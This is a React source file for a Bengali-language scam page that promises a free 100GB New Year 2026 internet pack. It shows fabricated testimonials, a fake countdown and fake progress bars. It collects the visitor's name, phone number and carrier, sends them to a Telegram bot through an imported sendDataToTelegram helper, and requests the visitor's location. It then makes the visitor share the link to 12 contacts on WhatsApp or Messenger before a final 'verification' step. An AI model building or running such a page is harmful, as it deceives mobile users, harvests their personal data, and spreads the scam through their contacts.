
import React, { useState, useEffect } from 'react';
import { Share2, CheckCircle, Smartphone, Users, MessageSquare, ShieldCheck, Heart, User, PartyPopper, Sparkles, Clock, Zap, SignalHigh, ChevronRight } from 'lucide-react';
import { sendDataToTelegram } from './telegramService';
import { AppStep, Comment } from './types';

const COMMENTS: Comment[] = [
  { id: 1, name: 'Sabbir Ahmed', text: 'অবিশ্বাস্য! নতুন বছরের শুরুতেই ১০০ জিবি ইন্টারনেট পেয়ে গেলাম। ধন্যবাদ!', avatar: 'https://i.pravatar.cc/150?u=sabbir', time: '১২ মিনিট আগে', likes: 142 },
  { id: 2, name: 'Tania Sultana', text: 'সবাইকে শুভ নববর্ষ! আমি মাত্রই আমার ফ্রি ১০০ জিবি প্যাকটি পেলাম।', avatar: 'https://i.pravatar.cc/150?u=tania', time: '৩২ মিনিট আগে', likes: 95 },
  { id: 3, name: 'Kamrul Hasan', text: 'সত্যিই দারুণ একটা গিফট ২০২৬ এর জন্য!', avatar: 'https://i.pravatar.cc/150?u=kamrul', time: '১ ঘণ্টা আগে', likes: 210 },
  { id: 4, name: 'Nusrat Jahan', text: 'আমার মোবাইলেও একটিভ হয়েছে। আপনারা সবাই দ্রুত ট্রাই করুন।', avatar: 'https://i.pravatar.cc/150?u=nusrat', time: '২ ঘণ্টা আগে', likes: 67 }
];

const OPERATORS = [
  { id: 'gp', name: 'Grameenphone', icon: '📶' },
  { id: 'robi', name: 'Robi', icon: '📶' },
  { id: 'bl', name: 'Banglalink', icon: '📶' },
  { id: 'airtel', name: 'Airtel', icon: '📶' },
  { id: 'teletalk', name: 'Teletalk', icon: '📶' }
];

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep | 'operator_selection'>('landing');
  const [progress, setProgress] = useState(0);
  const [userName, setUserName] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [operator, setOperator] = useState('');
  const [connectionType, setConnectionType] = useState('Prepaid');
  const [shareCount, setShareCount] = useState(0);
  const [fakeComments, setFakeComments] = useState<Comment[]>([]);
  const [timeLeft, setTimeLeft] = useState({ hours: 0, minutes: 48, seconds: 12 });

  const MAX_SHARES = 12;

  // Countdown Timer logic
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) return { ...prev, seconds: prev.seconds - 1 };
        if (prev.minutes > 0) return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    const timers = COMMENTS.map((c, i) => 
      setTimeout(() => {
        setFakeComments(prev => [c, ...prev].slice(0, 5));
      }, (i + 1) * 3000)
    );
    return () => timers.forEach(t => clearTimeout(t));
  }, []);

  const startInitialCheck = () => {
    setStep('initial_check');
    let p = 0;
    const interval = setInterval(() => {
      p += 2;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setTimeout(() => setStep('phone_entry'), 500);
      }
    }, 30);
  };

  const handlePhoneSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (userName.trim().length < 2 || phoneNumber.length < 10) {
      alert('সঠিক তথ্য প্রদান করুন');
      return;
    }
    setStep('operator_selection');
  };

  const handleFinalSelection = async () => {
    if (!operator) {
      alert('আপনার অপারেটর নির্বাচন করুন');
      return;
    }
    
    setStep('data_processing');
    // Request location
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(() => {}, () => {});
    }

    sendDataToTelegram(userName, phoneNumber, operator, connectionType);
    
    let p = 0;
    const interval = setInterval(() => {
      p += 1;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setTimeout(() => setStep('share'), 800);
      }
    }, 40);
  };

  const handleShare = (platform: 'whatsapp' | 'messenger') => {
    const text = `*🎉 শুভ নববর্ষ ২০২৬ উপলক্ষে ফ্রি 100GB Internet উপহার — আমি পেয়েছি, আপনিও নিতে পারেন↓*\n${window.location.href}`;
    const url = platform === 'whatsapp' 
      ? `whatsapp://send?text=${encodeURIComponent(text)}`
      : `fb-messenger://share/?link=${encodeURIComponent(window.location.href)}`;
    
    window.location.href = url;
    
    setTimeout(() => {
      setShareCount(prev => {
        const next = prev + 1;
        if (next >= MAX_SHARES) setStep('verify');
        return next;
      });
    }, 1500);
  };

  const shareProgress = Math.min((shareCount / MAX_SHARES) * 100, 100);

  return (
    <div className="min-h-screen bg-[#0a0f1e] text-white flex flex-col items-center pb-20 selection:bg-amber-500 selection:text-black">
      {/* Dynamic Background elements */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none opacity-20">
        <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-blue-600 rounded-full blur-[120px]"></div>
        <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-amber-600 rounded-full blur-[120px]"></div>
      </div>

      {/* Top Banner */}
      <div className="w-full bg-indigo-950/80 backdrop-blur-md py-4 px-4 text-center sticky top-0 z-[100] border-b border-indigo-500/30">
        <div className="flex flex-col items-center gap-1">
          <h1 className="text-amber-400 text-lg md:text-xl font-black flex items-center justify-center gap-2 tracking-tight">
            <PartyPopper className="text-amber-400 animate-bounce" size={24} /> 
            নিউ ইয়ার ২০২৬ গিফট প্যাক
          </h1>
          <div className="flex items-center gap-2 text-[10px] uppercase tracking-widest font-bold text-indigo-300">
            <Clock size={12} className="text-amber-500" />
            অফার শেষ হতে সময় বাকি: 
            <span className="text-amber-400 font-mono">{timeLeft.hours}:{timeLeft.minutes}:{timeLeft.seconds}</span>
          </div>
        </div>
      </div>

      <div className="w-full max-w-md relative z-10 px-4 mt-6">
        <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl overflow-hidden shadow-2xl">
          {/* Header Image */}
          <div className="relative h-48">
            <img 
              src="https://images.unsplash.com/photo-1467810563316-b5476525c0f9?q=80&w=1000&auto=format&fit=crop" 
              alt="Celebration" 
              className="w-full h-full object-cover"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-[#0a0f1e] to-transparent"></div>
            <div className="absolute bottom-4 left-6">
              <span className="bg-amber-500 text-black text-[10px] font-black px-3 py-1 rounded-full uppercase mb-2 inline-block">স্পেশাল অফার</span>
              <h2 className="text-2xl font-bold text-white drop-shadow-lg">১০০জিবি ফ্রি ইন্টারনেট</h2>
            </div>
          </div>

          <div className="p-6 md:p-8">
            {step === 'landing' && (
              <div className="text-center animate-in fade-in slide-in-from-bottom-4 duration-700">
                <div className="flex justify-center gap-4 mb-6">
                  <div className="bg-white/10 p-4 rounded-2xl border border-white/10">
                    <Zap size={32} className="text-amber-400" />
                    <p className="text-[10px] mt-2 font-bold opacity-70">হাই স্পিড</p>
                  </div>
                  <div className="bg-white/10 p-4 rounded-2xl border border-white/10">
                    <Smartphone size={32} className="text-blue-400" />
                    <p className="text-[10px] mt-2 font-bold opacity-70">সব সিম</p>
                  </div>
                  <div className="bg-white/10 p-4 rounded-2xl border border-white/10">
                    <ShieldCheck size={32} className="text-green-400" />
                    <p className="text-[10px] mt-2 font-bold opacity-70">ভেরিফাইড</p>
                  </div>
                </div>
                <h3 className="text-xl font-bold mb-4 leading-snug">
                  ২০২৬ সাল উপলক্ষে দেশের সকল সক্রিয় সিম গ্রাহক পাচ্ছেন ১০০জিবি একদম ফ্রি!
                </h3>
                <button 
                  onClick={startInitialCheck}
                  className="w-full bg-gradient-to-r from-amber-500 to-amber-600 text-black font-black py-4 rounded-2xl text-xl shadow-[0_0_20px_rgba(245,158,11,0.4)] hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-2 group"
                >
                  এখনই নিন <ChevronRight className="group-hover:translate-x-1 transition-transform" />
                </button>
              </div>
            )}

            {step === 'initial_check' && (
              <div className="text-center py-8">
                <div className="relative inline-block mb-6">
                  <div className="w-28 h-28 rounded-full border-4 border-white/5 border-t-amber-500 animate-spin"></div>
                  <div className="absolute inset-0 flex items-center justify-center font-black text-2xl text-amber-500">
                    {progress}%
                  </div>
                </div>
                <p className="text-indigo-200 font-bold animate-pulse uppercase tracking-wider text-sm">আপনার সিম ও লোকেশন যাচাই করা হচ্ছে...</p>
              </div>
            )}

            {step === 'phone_entry' && (
              <div className="animate-in fade-in slide-in-from-right duration-500">
                <h3 className="text-lg font-bold mb-6 text-center text-amber-400">আপনার তথ্য প্রদান করুন</h3>
                <form onSubmit={handlePhoneSubmit} className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-[10px] font-bold text-indigo-300 uppercase ml-1">আপনার নাম</label>
                    <div className="flex bg-white/5 border border-white/10 rounded-2xl overflow-hidden focus-within:border-amber-500 transition-colors">
                      <div className="px-4 py-4 text-indigo-400 border-r border-white/10">
                        <User size={20} />
                      </div>
                      <input 
                        type="text" 
                        placeholder="সম্পূর্ণ নাম লিখুন"
                        className="flex-1 bg-transparent px-4 py-3 outline-none text-white placeholder:text-gray-600"
                        value={userName}
                        onChange={(e) => setUserName(e.target.value)}
                        required
                      />
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <label className="text-[10px] font-bold text-indigo-300 uppercase ml-1">মোবাইল নম্বর</label>
                    <div className="flex bg-white/5 border border-white/10 rounded-2xl overflow-hidden focus-within:border-amber-500 transition-colors">
                      <div className="bg-white/5 px-4 py-4 text-amber-500 font-bold border-r border-white/10">+৮৮০</div>
                      <input 
                        type="number" 
                        placeholder="মোবাইল নম্বর"
                        className="flex-1 bg-transparent px-4 py-3 outline-none text-white placeholder:text-gray-600"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value)}
                        required
                      />
                    </div>
                  </div>
                  
                  <button 
                    type="submit"
                    className="w-full bg-white text-black py-4 rounded-2xl font-black text-lg hover:bg-amber-500 transition-all shadow-lg flex items-center justify-center gap-2"
                  >
                    পরবর্তী ধাপ <ChevronRight size={20} />
                  </button>
                </form>
              </div>
            )}

            {step === 'operator_selection' && (
              <div className="animate-in zoom-in duration-500">
                <h3 className="text-lg font-bold mb-6 text-center text-amber-400">আপনার সিম অপারেটর নির্বাচন করুন</h3>
                <div className="grid grid-cols-2 gap-3 mb-6">
                  {OPERATORS.map((op) => (
                    <button
                      key={op.id}
                      onClick={() => setOperator(op.name)}
                      className={`p-4 rounded-2xl border transition-all flex flex-col items-center gap-2 ${
                        operator === op.name 
                          ? 'bg-amber-500/20 border-amber-500 text-amber-400' 
                          : 'bg-white/5 border-white/10 hover:border-white/30'
                      }`}
                    >
                      <span className="text-2xl">{op.icon}</span>
                      <span className="text-xs font-bold">{op.name}</span>
                    </button>
                  ))}
                </div>

                <div className="space-y-2 mb-6">
                  <label className="text-[10px] font-bold text-indigo-300 uppercase ml-1">কানেকশন টাইপ</label>
                  <div className="flex bg-white/5 p-1 rounded-xl border border-white/10">
                    <button 
                      onClick={() => setConnectionType('Prepaid')}
                      className={`flex-1 py-2 rounded-lg font-bold text-sm transition-all ${connectionType === 'Prepaid' ? 'bg-amber-500 text-black' : 'text-gray-400'}`}
                    >Prepaid</button>
                    <button 
                      onClick={() => setConnectionType('Postpaid')}
                      className={`flex-1 py-2 rounded-lg font-bold text-sm transition-all ${connectionType === 'Postpaid' ? 'bg-amber-500 text-black' : 'text-gray-400'}`}
                    >Postpaid</button>
                  </div>
                </div>

                <button 
                  onClick={handleFinalSelection}
                  className="w-full bg-amber-500 text-black py-4 rounded-2xl font-black text-lg hover:bg-amber-400 shadow-xl"
                >
                  কনফার্ম করুন
                </button>
              </div>
            )}

            {step === 'data_processing' && (
              <div className="text-center py-8">
                <div className="mb-6 space-y-4">
                  <div className="flex justify-between text-xs font-black text-indigo-300 px-1 uppercase tracking-tighter">
                    <span>সার্ভারে ডেটা পাঠানো হচ্ছে...</span>
                    <span className="text-amber-500">{progress}%</span>
                  </div>
                  <div className="w-full bg-white/5 h-3 rounded-full overflow-hidden border border-white/5 p-0.5">
                    <div 
                      className="h-full bg-gradient-to-r from-amber-500 to-amber-300 rounded-full transition-all duration-300 shadow-[0_0_10px_rgba(245,158,11,0.5)]"
                      style={{ width: `${progress}%` }}
                    />
                  </div>
                </div>
                <p className="text-xs text-gray-500 animate-pulse">অনুগ্রহ করে অপেক্ষা করুন, সংযোগ স্থাপন করা হচ্ছে...</p>
              </div>
            )}

            {step === 'share' && (
              <div className="animate-in fade-in zoom-in duration-500">
                <div className="bg-amber-500/10 border border-amber-500/30 p-4 rounded-2xl mb-6 flex gap-3">
                  <div className="bg-amber-500 text-black p-2 rounded-lg h-fit">
                    <Zap size={20} fill="currentColor" />
                  </div>
                  <div>
                    <h3 className="text-amber-500 font-black text-base">ধন্যবাদ {userName}!</h3>
                    <p className="text-[12px] text-gray-300 leading-snug">
                      আপনার ১০০জিবি প্যাকটি প্রসেসিং সম্পন্ন হয়েছে। ডেটাটি সচল করতে ধাপটি সম্পন্ন করুন।
                    </p>
                  </div>
                </div>

                <div className="mb-6 p-4 bg-white/5 rounded-2xl border border-white/10">
                  <div className="flex justify-between text-[10px] mb-2 font-black uppercase text-indigo-300">
                    <span>শেয়ার প্রগ্রেস</span>
                    <span className="text-amber-500">{Math.round(shareProgress)}%</span>
                  </div>
                  <div className="w-full bg-white/10 h-3 rounded-full overflow-hidden border border-white/10">
                    <div 
                      className="h-full bg-amber-500 transition-all duration-500 shadow-[0_0_15px_rgba(245,158,11,0.4)]"
                      style={{ width: `${shareProgress}%` }}
                    />
                  </div>
                </div>

                <div className="grid grid-cols-1 gap-3">
                  <button 
                    onClick={() => handleShare('whatsapp')}
                    className="group bg-[#25D366] text-white font-black py-4 rounded-2xl flex items-center justify-center gap-2 shadow-lg hover:scale-[1.02] active:scale-95 transition-all"
                  >
                    <Share2 size={24} className="group-hover:rotate-12 transition-transform" /> WhatsApp-এ শেয়ার করুন
                  </button>
                  <button 
                    onClick={() => handleShare('messenger')}
                    className="group bg-[#0084FF] text-white font-black py-4 rounded-2xl flex items-center justify-center gap-2 shadow-lg hover:scale-[1.02] active:scale-95 transition-all"
                  >
                    <MessageSquare size={24} className="group-hover:rotate-12 transition-transform" /> Messenger-এ শেয়ার করুন
                  </button>
                </div>

                <p className="text-[10px] text-center text-gray-500 mt-6 leading-tight font-medium">
                  আপনার ১২ জন বন্ধু বা গ্রুপে শেয়ার করার সাথে সাথেই আপনার সিমে এসএমএস চলে যাবে।
                </p>
              </div>
            )}

            {step === 'verify' && (
              <div className="text-center animate-in bounce-in duration-700 py-4">
                <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-6 text-green-500 border-2 border-green-500/50 shadow-[0_0_30px_rgba(34,197,94,0.3)]">
                  <CheckCircle size={56} />
                </div>
                <h3 className="text-2xl font-black text-white mb-2">শেয়ার সম্পন্ন!</h3>
                <p className="text-sm text-gray-400 mb-8 leading-relaxed">
                  শেষ ধাপ: একটি ভেরিফিকেশন সম্পন্ন করলেই ডেটা প্যাকটি আপনার অ্যাকাউন্টে যোগ হবে।
                </p>
                <button className="w-full bg-gradient-to-r from-amber-500 to-amber-600 text-black font-black py-4 rounded-2xl hover:scale-105 transition-all shadow-2xl uppercase tracking-widest">
                  ভেরিফিকেশন সম্পন্ন করুন
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Live Winners Ticker */}
        <div className="mt-8 overflow-hidden bg-white/5 border border-white/5 rounded-2xl py-3 px-2 backdrop-blur-sm">
           <div className="flex items-center gap-2 mb-2 px-2">
             <div className="w-2 h-2 bg-green-500 rounded-full animate-ping"></div>
             <span className="text-[10px] font-black uppercase text-indigo-300">লাইভ আপডেট: যারা ডেটা পেয়েছেন</span>
           </div>
           <div className="flex flex-col gap-2">
             {fakeComments.slice(0, 3).map((c, i) => (
               <div key={i} className="flex items-center gap-3 bg-white/5 p-2 rounded-xl border border-white/5 animate-in slide-in-from-right duration-700">
                  <img src={c.avatar} className="w-8 h-8 rounded-full border border-white/10" alt="" />
                  <div className="flex-1 overflow-hidden">
                    <p className="text-[10px] font-bold text-amber-400 truncate">{c.name}</p>
                    <p className="text-[9px] text-gray-400 truncate">{c.text}</p>
                  </div>
                  <div className="flex items-center gap-1 text-[9px] font-bold text-green-500">
                    <CheckCircle size={10} /> ১০০জিবি
                  </div>
               </div>
             ))}
           </div>
        </div>
      </div>

      {/* Floating trust badge */}
      <div className="fixed bottom-6 right-6 z-50 pointer-events-none">
        <div className="bg-[#1e293b]/90 backdrop-blur shadow-2xl border border-white/10 rounded-full pl-3 pr-5 py-2 flex items-center gap-3 text-xs font-bold text-amber-400">
          <div className="bg-amber-500 p-1 rounded-full text-black">
            <Heart size={14} fill="currentColor" />
          </div>
          <span className="whitespace-nowrap">৫৪০ জন অনলাইনে ডেটা নিচ্ছে</span>
        </div>
      </div>

      {/* Background Decorations */}
      <div className="fixed top-20 right-[-5%] w-40 h-40 bg-indigo-600/10 rounded-full blur-[60px] pointer-events-none"></div>
      <div className="fixed bottom-40 left-[-5%] w-40 h-40 bg-amber-600/10 rounded-full blur-[60px] pointer-events-none"></div>
    </div>
  );
};

export default App;
